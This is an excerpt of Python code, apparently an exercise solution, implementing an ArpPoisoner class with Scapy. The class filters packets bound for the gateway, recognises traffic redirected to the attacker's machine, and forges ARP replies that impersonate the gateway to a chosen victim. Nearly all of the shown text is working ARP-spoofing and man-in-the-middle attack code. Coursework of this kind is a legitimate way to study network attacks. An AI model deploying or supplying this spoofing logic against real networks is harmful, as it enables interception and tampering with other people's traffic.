...
class ArpPoisoner(object):
    ...
    def is_packet_to_original_gateway(self, packet):
        ...
        """
        try:
            if ((packet[S.Ether].src == self.our_mac) or (packet[S.IP].src == self.our_ip)): #let's not poison our own packets
                return False
            if ((packet[S.Ether].dst == self.gateway_mac) and (packet[S.IP].dst != self.gateway_ip)): #Sent to gateway with different ip - going out of network
                return True
            return False
        except:
            return False
    ...
    def is_stolen_packet(self, packet):
        ...
        Note: You may assume all packets have both IP and Ethernet layers.
        """
        if ((packet[S.Ether].dst == self.our_mac) and (packet[S.IP].dst != self.our_ip)):
            return True
        return False
    ...
    def create_poison(self, victim_packet):
        ...
        2. Don't poison everyone on the network - poison only this specific
           victim.
        """
        resp = S.ARP(op=2, psrc=self.gateway_ip, pdst=victim_packet[S.IP].src, hwdst=victim_packet[S.Ether].src)
        return resp
